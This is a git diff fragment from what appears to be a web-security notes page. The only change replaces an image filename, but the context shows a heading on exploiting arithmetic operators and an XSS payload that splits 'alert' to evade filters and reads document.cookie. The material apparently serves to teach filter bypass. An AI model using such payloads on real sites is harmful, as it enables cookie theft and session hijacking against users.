@@ -641,7 +641,7 @@ in the code if last\_session exist make last\_session = 0
 
 Exploit using Arithmetic Operators
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```javascript
  /?user=')|eval('onload=a'.concat('lert(document.cookie)'))//
